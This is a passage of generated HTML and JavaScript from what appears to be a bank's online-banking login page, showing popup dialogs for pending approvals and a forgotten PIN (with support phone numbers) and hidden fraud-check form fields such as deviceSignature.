                                                                                <a onclick="ajaxButtonAction( null, 'C2__C2__C1____3908C9CA31FB1A40 FormButton 13', 'C2__C2__C1__BUT_3908C9CA31FB1A40103698', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" class="triggerNoNotificationsPopup" id="C2__C2__C1__BUT_3908C9CA31FB1A40103698" handlerchanged="Y" onoldclick="ajaxButtonAction( null, 'C2__C2__C1____3908C9CA31FB1A40 FormButton 13', 'C2__C2__C1__BUT_3908C9CA31FB1A40103698', false, null, '', 'servletcontroller', '', false, true, '' );"><span>AddedSecurityPopupTrigger</span></a>

                                                                                <script type="text/javascript" charset="utf-8">
                                                                                    //<![CDATA[



                                                                                    $(function() {

                                                                                        function doWork(e) {




                                                                                            e.preventDefault();
                                                                                            e.stopPropagation();
                                                                                            try {
                                                                                                window.boiCbs.openDialog({
                                                                                                    id: "C2__C2__C1__BUT_3908C9CA31FB1A40103698"
                                                                                                    , COMPONENT_ID_PREFIX: "C2__C2__C1__"
                                                                                                    , IdToUpdate: "AddedOnlineSecurityDialog"
                                                                                                    , ClassToRemove: ""
                                                                                                    , ClassToToggle: ""
                                                                                                    , ClassToAdd: ""
                                                                                                    , ParentContextSelector: ""
                                                                                                    , AnimationType: ""
                                                                                                })
                                                                                            } catch (e) {
                                                                                                log("Problem running javascript function: window.boiCbs.openDialog");
                                                                                            }









                                                                                            var $parent = $("html");




                                                                                            if (!(typeof(boiparm) == 'undefined')) {
                                                                                                if (typeof(boiparm.boiform) == 'function') {
                                                                                                    boiparm.boiform('C2__C2__C1__boi_prefs');
                                                                                                }
                                                                                            }




                                                                                        }
                                                                                        var $el = $("#C2__C2__C1__BUT_3908C9CA31FB1A40103698:not([handlerChanged='Y'])");
                                                                                        $el.attr("handlerChanged", "Y")
                                                                                            .attr("onoldclick", $el.attr("onclick"))
                                                                                            .removeProp("onclick");
                                                                                        if (!$el.hasClass("boi-delegate-click-to-container") && ("" === "")) {
                                                                                            $el.on("click", function(e) {
                                                                                                doWork(e);
                                                                                            });
                                                                                        }

                                                                                        //Add support for space bar button click
                                                                                        $("#C2__C2__C1__BUT_3908C9CA31FB1A40103698").keydown(function(e) {
                                                                                            if (e.which == 32) {
                                                                                                $("#C2__C2__C1__BUT_3908C9CA31FB1A40103698").click();
                                                                                                e.preventDefault();
                                                                                            }
                                                                                        });
                                                                                    });
                                                                                    //]]>
                                                                                </script>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div id="C2__C2__C1__AddedOnlineSecurityDialog" class="col-hidden boi-position-center boi-popup-dialog__wrapper testPop">
                                                                    <div>
                                                                        <div id="C2__C2__C1__p1_GRP_1D5B2AE18154504654591" style="position: relative">
                                                                            <div id="C2__C2__C1__FMT_1D5B2AE18154504655142" class="boi-popup-dialog__title--background--red boi-flex--horizontal--justify boi-flex">
                                                                                <div id="C2__C2__C1__row_HEAD_1D5B2AE18154504654960">
                                                                                    <div id="C2__C2__C1__p1_HEAD_1D5B2AE18154504654960">
                                                                                        <div>
                                                                                            <h1 id="C2__C2__C1__HEAD_1D5B2AE18154504654960" class="boi-popup-dialog__title  ecDIB  ">No approvals waiting</h1>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <div id="C2__C2__C1__FMT_1D5B2AE18154504655200" class="boi-padding-20">
                                                                                <p class="boi_input boi-logout-popouttxt text-center ">There are no actions waiting for your approval.</p>
                                                                                <div id="C2__C2__C1__row_BUT_1D5B2AE18154504654970">
                                                                                    <div id="C2__C2__C1__p1_BUT_1D5B2AE18154504654970" class="ecDIB  col-hidden">
                                                                                        <div>&nbsp;</div>
                                                                                    </div>
                                                                                    <div class="ecDIB  tc-full-width  " style="text-align: center; " id="C2__C2__C1__p4_BUT_1D5B2AE18154504654970">
                                                                                        <div><button title="Close" onclick="ajaxButtonAction( null, 'C2__C2__C1____1D5B2AE181545046 FormButton 12', 'C2__C2__C1__BUT_1D5B2AE18154504654970', false, null, '', 'servletcontroller', '', false, true, '' );" type="button" name="C2__C2__C1____1D5B2AE181545046 FormButton 12" value="Close" class="boi-grey-button-large boi-tg__font--semibold boi-close-popup" id="C2__C2__C1__BUT_1D5B2AE18154504654970">Close</button></div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div id="C2__C2__C1__FMT_EA4E6FDB2E79E881133376" class="boi-login-forgotPIN button-with-popup">
                                                                <div class="ecDIBCol  ecDIB  button-with-popup" id="C2__C2__C1__COL_947D133FD9BBCC3C145342">
                                                                    <div id="C2__C2__C1__row_BUT_EA4E6FDB2E79E881133224" class="boi-login-forgotPIN boi-mb-10 boi-mt-20 margin-bottom-0-xsm  ">
                                                                        <div id="C2__C2__C1__p1_BUT_EA4E6FDB2E79E881133224" class="ecDIB  ">
                                                                            <div>&nbsp;</div>
                                                                        </div>
                                                                        <div class="ecDIB  " style="text-align: left; " id="C2__C2__C1__p4_BUT_EA4E6FDB2E79E881133224">
                                                                            <div>
                                                                                <a onclick="ajaxButtonAction( null, 'C2__C2__C1____EA4E6FDB2E79E881 FormButton 10', 'C2__C2__C1__BUT_EA4E6FDB2E79E881133224', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" id="C2__C2__C1__BUT_EA4E6FDB2E79E881133224" handlerchanged="Y" onoldclick="ajaxButtonAction( null, 'C2__C2__C1____EA4E6FDB2E79E881 FormButton 10', 'C2__C2__C1__BUT_EA4E6FDB2E79E881133224', false, null, '', 'servletcontroller', '', false, true, '' );"><span>Forgot your PIN <i class="fa fa-arrow-circle-right boi-fs-16 ml-5 " aria-hidden="true"></i></span></a>

                                                                                <script type="text/javascript" charset="utf-8">
                                                                                    //<![CDATA[



                                                                                    $(function() {


                                                                                        function doWork() {


                                                                                            try {
                                                                                                window.boiCbs.openDialog({
                                                                                                    id: "C2__C2__C1__BUT_EA4E6FDB2E79E881133224"
                                                                                                    , COMPONENT_ID_PREFIX: "C2__C2__C1__"
                                                                                                    , IdToUpdate: "ForgotPINDialog"
                                                                                                    , ClassToRemove: ""
                                                                                                    , ClassToToggle: ""
                                                                                                    , ClassToAdd: ""
                                                                                                    , ParentContextSelector: ""
                                                                                                    , AnimationType: ""
                                                                                                    , DefaultTextOnButton: ""
                                                                                                    , ClickedTextOnButton: ""
                                                                                                    , isHybrid: ""
                                                                                                    , DisableDefaultCloseDialogButton: "N"
                                                                                                    , hashedUserId: ""
                                                                                                    , processName: ""
                                                                                                    , phaseName: ""
                                                                                                })
                                                                                            } catch (e) {
                                                                                                log("Problem running javascript function: window.boiCbs.openDialog");
                                                                                            }









                                                                                            var $parent = $("html");








                                                                                        }
                                                                                        var $el = $("#C2__C2__C1__BUT_EA4E6FDB2E79E881133224:not([handlerChanged='Y'])");
                                                                                        $el.attr("handlerChanged", "Y")
                                                                                            .attr("onoldclick", $el.attr("onclick"))
                                                                                            .removeProp("onclick")
                                                                                            .on("click", function(e) {
                                                                                                doWork();
                                                                                            });




                                                                                    });
                                                                                    //]]>
                                                                                </script>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div id="C2__C2__C1__ForgotPINDialog" class="col-hidden boi-position-center boi-popup-dialog__wrapper boi-popup-wide">
                                                                    <div>
                                                                        <div id="C2__C2__C1__p1_GRP_698FECF48344073F294070" style="position: relative">
                                                                            <div id="C2__C2__C1__FMT_947D133FD9BBCC3C146029" class="boi-popup-dialog__title--background boi-flex--horizontal--justify boi-flex">
                                                                                <div id="C2__C2__C1__row_HEAD_698FECF48344073F294075">
                                                                                    <div id="C2__C2__C1__p1_HEAD_698FECF48344073F294075">
                                                                                        <div>
                                                                                            <h1 id="C2__C2__C1__HEAD_698FECF48344073F294075" class="boi-popup-dialog__title  ecDIB  ">Forgot your PIN</h1>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <div id="C2__C2__C1__FMT_947D133FD9BBCC3C146491" class="boi-padding-20">
                                                                                <div style="text-align: left; " id="C2__C2__C1__TXT_C2B2BA6513B3A5FC304429">
                                                                                    <div class="boi_contact-phonenumbers">
                                                                                        <div class="boi_contact-phonenumbers-row">
                                                                                            <div>
                                                                                                <p class="boi_label">Republic of Ireland</p>
                                                                                                <p class="boi_input" role="text" aria-label="0 8 1 8. 3 6 5. 3 6 5">0818 365 365</p>
                                                                                            </div>
                                                                                            <div class="col-hidden-md col-hidden-lg col-hidden-xl">
                                                                                                <a class="boi-href-icon-wrapper" role="button" aria-label="Double tap to call the number 0 8 1 8. 3 6 5. 3 6 5" href="tel:0818 365 365"><span class="boi_blue_tone fa boi-fa-icon-22 fa-phone"></span></a>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div class="boi_contact-phonenumbers-row">
                                                                                            <div>
                                                                                                <p class="boi_label">Northern Ireland and Great Britain</p>
                                                                                                <p class="boi_input" role="text" aria-label="0 3 4 5. 7. 3 6 5. 5 5 5">0345 7 365 555</p>
                                                                                            </div>
                                                                                            <div class="col-hidden-md col-hidden-lg col-hidden-xl">
                                                                                                <a class="boi-href-icon-wrapper" role="button" aria-label="Double tap to call the number 0 3 4 5. 7. 3 6 5. 5 5 5" href="tel:0345 7 365 555"><span class="boi_blue_tone fa boi-fa-icon-22 fa-phone"></span></a>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div class="boi_contact-phonenumbers-row">
                                                                                            <div>
                                                                                                <p class="boi_label">Other locations (RoI)</p>
                                                                                                <p class="boi_input" role="text" aria-label="+ 3 5 3. 1. 4 0 4. 4 0 0 0">+353 1 404 4000</p>
                                                                                            </div>
                                                                                            <div class="col-hidden-md col-hidden-lg col-hidden-xl">
                                                                                                <a class="boi-href-icon-wrapper" role="button" aria-label="Double tap to call the number + 3 5 3. 1. 4 0 4. 4 0 0 0" href="tel:+353 1 404 4000"><span class="boi_blue_tone fa boi-fa-icon-22 fa-phone"></span></a>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div class="boi_contact-phonenumbers-row">
                                                                                            <div>
                                                                                                <p class="boi_label">Other locations (NI/GB)</p>
                                                                                                <p class="boi_input" role="text" aria-label="+ 4 4. 3 4 5. 7. 3 6 5. 5 5 5.">+44 345 7365 555</p>
                                                                                            </div>
                                                                                            <div class="col-hidden-md col-hidden-lg col-hidden-xl">
                                                                                                <a class="boi-href-icon-wrapper" role="button" aria-label="Double tap to call the number + 4 4. 3 4 5. 7. 3 6 5. 5 5 5." href="tel:+44 345 7365 555"><span class="boi_blue_tone fa boi-fa-icon-22 fa-phone"></span></a>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                                <p class="boi_label boi-mb-4 ">Opening hours</p>
                                                                                <div id="C2__C2__C1__row_HEAD_698FECF48344073F294132">
                                                                                    <div id="C2__C2__C1__p1_HEAD_698FECF48344073F294132" class="ecDIB  boi_label_sm_regular">
                                                                                        <div>Republic of Ireland: 9am to 5pm, Monday to Friday and 10am to 4pm Saturdays and Sundays.</div>
                                                                                    </div>
                                                                                </div>
                                                                                <p class="boi_label_sm_regular ">Northern Ireland and Great Britain: 9am to 5pm, Monday to Friday and 9am to 2pm on Saturdays. Closed on Sunday.</p>
                                                                                <div id="C2__C2__C1__row_BUT_698FECF48344073F294142" class="btn-primary-large text-center boi-mt-25 boi-mb-15  ">
                                                                                    <div id="C2__C2__C1__p1_BUT_698FECF48344073F294142" class="ecDIB  col-hidden">
                                                                                        <div>&nbsp;</div>
                                                                                    </div>
                                                                                    <div class="ecDIB  col-full-xs col-full-sm  " style="text-align: center; " id="C2__C2__C1__p4_BUT_698FECF48344073F294142">
                                                                                        <div><button onclick="ajaxButtonAction( null, 'C2__C2__C1____698FECF48344073F FormButton 3', 'C2__C2__C1__BUT_698FECF48344073F294142', false, null, '', 'servletcontroller', '', false, true, '' );" type="button" name="C2__C2__C1____698FECF48344073F FormButton 3" value="Close" class="boi-remove-title boi-rounded-1 boi-primary-card-button boi-full-width Btn_primary boi-close-popup boi-exit-popup boi-overlay-btn-270" id="C2__C2__C1__BUT_698FECF48344073F294142">Close</button></div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div id="C2__C2__C1__FMT_5766E49704FC4D2050362" class="boi-login-forgotPIN button-with-popup" style="display: none;"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div id="C2__C2__C1__FMT_A53740C32AC55A0A688320" class="tc-clearfix" style="display: none;"></div>
                                            <div id="C2__C2__C1__FMT_EE2388261BD9E668546421">
                                                <div id="C2__C2__C1__row_QUE_EE2388261BD9E668530236" class="responsive-row tc-row-part tc-row-flex rgrid_3_8_12_12_16  " style="display: none;">
                                                    <div id="C2__C2__C1__p1_QUE_EE2388261BD9E668530236" style="display: none;" class="ecDIB  responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl tc-question-part tc-bold">
                                                        <div><label for="C2__C2__C1__QUE_EE2388261BD9E668530236">HDMData</label><span id="C2__C2__C1__p2_QUE_EE2388261BD9E668530236" class="tc-mand-part tc-normal-weight"> </span></div>
                                                    </div>
                                                    <div style="display: none;" class="ecDIB  responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part  " id="C2__C2__C1__p4_QUE_EE2388261BD9E668530236">
                                                        <div class="ext-tc-radio-input"><input type="text" name="C2__C2__C1__WORKINGELEMENTS[1].FRAUDNETPARAMS[1].HDMDATA" id="C2__C2__C1__QUE_EE2388261BD9E668530236" class="tc-form-control tc-half-answer-width tc-default-input tc-rounded-1  " size="15" maxlength="256" onfocus="doOnFocus('', this.id, '');" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);}" onkeypress="return(checkForDefaultButtonAction(event, this, 'C2__C2__C1__F', ''))" onchange="startJob('', 'onchange', 'C2__C2__C1__QUE_EE2388261BD9E668530236');trimValue(this,'');if (isLegalExpresion(this,['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon',''])&amp;&amp;validAllChars(this, '', '', ['Please enter a valid HDMData', '', ''], '', true, ['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon',''])) {endJob('', 'onchange', true, 'C2__C2__C1__QUE_EE2388261BD9E668530236'); return true;} else {endJob('', 'onchange', false, 'C2__C2__C1__QUE_EE2388261BD9E668530236'); return false;}" aria-required="false" aria-label="HDMData" aria-describedby="C2__C2__C1__QUE_EE2388261BD9E668530236_ERRORMESSAGE"><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__C2__C1__QUE_EE2388261BD9E668530236_ERRORMESSAGE" aria-live="assertive"></span></div>
                                                    </div>
                                                </div>
                                            
                                                <div id="C2__C2__C1__row_boi_prefs" class="responsive-row tc-row-part tc-row-flex rgrid_3_8_12_12_16  " style="display: none;">
                                                    <div id="C2__C2__C1__p1_boi_prefs" style="display: none;" class="ecDIB  responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl tc-question-part tc-bold">
                                                        <div><label for="C2__C2__C1__boi_prefs">JSC</label><span id="C2__C2__C1__p2_boi_prefs" class="tc-mand-part tc-normal-weight"> </span></div>
                                                    </div>
                                                    <div style="display: none;" class="ecDIB  responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part  " id="C2__C2__C1__p4_boi_prefs">
                                                        <div class="ext-tc-radio-input"><input type="text" name="C2__C2__C1__WORKINGELEMENTS[1].FRAUDNETPARAMS[1].JSC" id="C2__C2__C1__boi_prefs" class="tc-form-control tc-half-answer-width tc-default-input tc-rounded-1  " size="15" maxlength="256" onfocus="doOnFocus('', this.id, '');" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);}" onkeypress="return(checkForDefaultButtonAction(event, this, 'C2__C2__C1__F', ''))" onchange="startJob('', 'onchange', 'C2__C2__C1__boi_prefs');trimValue(this,'');if (isLegalExpresion(this,['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon',''])&amp;&amp;validAllChars(this, '', '', ['Please enter a valid JSC', '', ''], '', true, ['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width','tc-postfix-part','tc-help-icon',''])) {endJob('', 'onchange', true, 'C2__C2__C1__boi_prefs'); return true;} else {endJob('', 'onchange', false, 'C2__C2__C1__boi_prefs'); return false;}" aria-required="false" aria-label="JSC" aria-describedby="C2__C2__C1__boi_prefs_ERRORMESSAGE"><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__C2__C1__boi_prefs_ERRORMESSAGE" aria-live="assertive"></span></div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div>
                                                <div id="C2__C2__C1__row_QUE_B99CC1DE8080F91B600465" class="responsive-row tc-row-flex rgrid_3_8_12_12_16  ">
                                                    <div class="ecDIB  responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part hide  " id="C2__C2__C1__p4_QUE_B99CC1DE8080F91B600465">
                                                        <div class="ext-tc-radio-input"><label for="C2__C2__C1__QUE_B99CC1DE8080F91B600465" class="accessibilityStyle">deviceSignature</label><input type="text" name="C2__C2__C1__WORKINGELEMENTS[1].FRAUDNETPARAMS[1].DEVICESIGNATURE" id="C2__C2__C1__QUE_B99CC1DE8080F91B600465" class="tc-form-control tc-half-answer-width deviceSignature tc-default-input tc-rounded-1  " size="15" maxlength="256" onfocus="doOnFocus('', this.id, '');" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);}" onkeypress="return(checkForDefaultButtonAction(event, this, 'C2__C2__C1__F', ''))" onchange="startJob('', 'onchange', 'C2__C2__C1__QUE_B99CC1DE8080F91B600465');trimValue(this,'');if (isLegalExpresion(this,['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','responsive-row  tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part hide','tc-form-control tc-half-answer-width deviceSignature','tc-postfix-part','tc-help-icon','','responsive-row  tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part hide','tc-form-control tc-half-answer-width deviceSignature','tc-postfix-part','tc-help-icon','','responsive-row  tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part hide','tc-form-control tc-half-answer-width deviceSignature','tc-postfix-part','tc-help-icon',''])&amp;&amp;validAllChars(this, '', '', ['Please enter a valid deviceSignature', '', ''], '', true, ['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','responsive-row  tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part hide','tc-form-control tc-half-answer-width deviceSignature','tc-postfix-part','tc-help-icon','','responsive-row  tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part hide','tc-form-control tc-half-answer-width deviceSignature','tc-postfix-part','tc-help-icon','','responsive-row  tc-row-flex rgrid_3_8_12_12_16','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part hide','tc-form-control tc-half-answer-width deviceSignature','tc-postfix-part','tc-help-icon',''])) {endJob('', 'onchange', true, 'C2__C2__C1__QUE_B99CC1DE8080F91B600465'); return true;} else {endJob('', 'onchange', false, 'C2__C2__C1__QUE_B99CC1DE8080F91B600465'); return false;}" aria-required="false" aria-label="deviceSignature" aria-describedby="C2__C2__C1__QUE_B99CC1DE8080F91B600465_ERRORMESSAGE"><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__C2__C1__QUE_B99CC1DE8080F91B600465_ERRORMESSAGE" aria-live="assertive"></span></div>
                                                    </div>
                                                </div>
                                                <div id="C2__C2__C1__row_QUE_022B585D956FDDA4365156" class="hide  ">
                                                    <div id="C2__C2__C1__p1_QUE_022B585D956FDDA4365156" class="ecDIB  responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl tc-question-part tc-bold">
                                                        <div><label for="C2__C2__C1__QUE_022B585D956FDDA4365156">HiddenQuestionToGetUserProfileJSON</label><span id="C2__C2__C1__p2_QUE_022B585D956FDDA4365156" class="tc-mand-part tc-normal-weight">*</span></div>
                                                    </div>
                                                    <div class="ecDIB  responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part  " id="C2__C2__C1__p4_QUE_022B585D956FDDA4365156">
                                                        <div class="ext-tc-radio-input"><input type="text" name="C2__C2__C1__LOGIN[1].SCA[1].USERPROFILEJSON" id="C2__C2__C1__QUE_022B585D956FDDA4365156" class="tc-form-control tc-half-answer-width userProfileJSON tc-default-input tc-rounded-1  " size="15" maxlength="256" onfocus="doOnFocus('', this.id, '');" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);}" onkeypress="return(checkForDefaultButtonAction(event, this, 'C2__C2__C1__F', ''))" onchange="startJob('', 'onchange', 'C2__C2__C1__QUE_022B585D956FDDA4365156');trimValue(this,'');if (isLegalExpresion(this,['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width userProfileJSON','tc-postfix-part','tc-help-icon','','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width userProfileJSON','tc-postfix-part','tc-help-icon','','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width userProfileJSON','tc-postfix-part','tc-help-icon',''])&amp;&amp;validAllChars(this, '', '', ['Please enter a valid HiddenQuestionToGetUserProfileJSON', '', ''], '', true, ['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width userProfileJSON','tc-postfix-part','tc-help-icon','','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width userProfileJSON','tc-postfix-part','tc-help-icon','','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part 